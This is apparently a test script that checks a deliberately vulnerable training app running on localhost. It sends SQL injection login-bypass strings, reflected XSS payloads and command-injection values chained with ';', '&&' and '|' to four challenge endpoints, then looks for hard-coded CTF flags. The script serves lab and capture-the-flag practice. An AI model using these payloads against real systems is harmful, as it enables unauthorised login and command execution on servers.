#!/usr/bin/env python3
"""
Direct test of vulnerable app endpoints - run on Kali while app is running
"""
import requests
import json

BASE_URL = 'http://localhost:8080'

print("=" * 70)
print("VULNERABLE APP - DIRECT ENDPOINT TESTS")
print("=" * 70)

# Test 1: Challenge 1 - SQL Injection Login
print("\n[TEST 1] Challenge 1 - SQL Injection (Login Form)")
print("-" * 70)
payloads = [
    ("' OR '1'='1' -- ", ""),
    ("admin'--", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
]

for username, password in payloads:
    print(f"\n  Payload: username='{username}' | password='{password}'")
    try:
        resp = requests.post(f'{BASE_URL}/login', data={'username': username, 'password': password}, timeout=5)
        if 'FLAG{sql_injection_bypass_123}' in resp.text:
            print(f"  ✅ SUCCESS! FLAG FOUND in response")
            print(f"  Flag: FLAG{sql_injection_bypass_123}")
        elif 'Login Successful' in resp.text or 'admin' in resp.text.lower():
            print(f"  ⚠️  Login successful but flag not shown. Checking response...")
            if 'is_admin' in resp.text or 'Admin: Yes' in resp.text:
                print(f"  Response indicates admin access but flag missing")
            print(f"  Response snippet: {resp.text[200:400]}")
        else:
            print(f"  ❌ No flag or success message")
    except Exception as e:
        print(f"  ❌ ERROR: {e}")

# Test 2: Challenge 2 - XSS
print("\n\n[TEST 2] Challenge 2 - XSS (Search)")
print("-" * 70)
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
]

for payload in xss_payloads:
    print(f"\n  Payload: {payload}")
    try:
        resp = requests.get(f'{BASE_URL}/search', params={'q': payload}, timeout=5)
        if 'FLAG{xss_reflected_456}' in resp.text:
            print(f"  ✅ SUCCESS! FLAG FOUND")
        else:
            print(f"  ❌ No XSS flag found")
    except Exception as e:
        print(f"  ❌ ERROR: {e}")

# Test 3: Challenge 3 - Command Injection
print("\n\n[TEST 3] Challenge 3 - Command Injection (Ping)")
print("-" * 70)
cmd_payloads = [
    "localhost; whoami",
    "127.0.0.1 && id",
    "localhost | cat /etc/hostname",
]

for payload in cmd_payloads:
    print(f"\n  Payload: {payload}")
    try:
        resp = requests.post(f'{BASE_URL}/ping', data={'host': payload}, timeout=5)
        if 'FLAG{command_injection_789}' in resp.text:
            print(f"  ✅ SUCCESS! FLAG FOUND")
        elif 'uid=' in resp.text or 'root' in resp.text or 'kali' in resp.text:
            print(f"  ⚠️  Command executed but flag not shown")
            print(f"  Response contains command output indicators")
        else:
            print(f"  ❌ No command injection flag found")
    except Exception as e:
        print(f"  ❌ ERROR: {e}")

# Test 4: Challenge 5 - API Login
print("\n\n[TEST 4] Challenge 5 - API Login (JSON)")
print("-" * 70)
api_payloads = [
    {"username": "' OR '1'='1' -- ", "password": ""},
    {"username": "admin'--", "password": "anything"},
]

for payload in api_payloads:
    print(f"\n  Payload: {json.dumps(payload)}")
    try:
        resp = requests.post(f'{BASE_URL}/api/login', json=payload, timeout=5)
        response_json = resp.json()
        if response_json.get('user', {}).get('flag'):
            print(f"  ✅ SUCCESS! FLAG: {response_json['user']['flag']}")
        elif response_json.get('success'):
            print(f"  ⚠️  Login successful but no flag in response")
            print(f"  Response: {response_json}")
        else:
            print(f"  ❌ Login failed or no flag")
    except Exception as e:
        print(f"  ❌ ERROR: {e}")

print("\n" + "=" * 70)
print("TESTS COMPLETE")
print("=" * 70)
print("\nIf no flags are showing despite successful login, the app may need:")
print("1. Delete vulnerable.db and restart app to recreate with users")
print("2. Check that admin user has is_admin=True")
print("3. Verify queries actually return admin records")
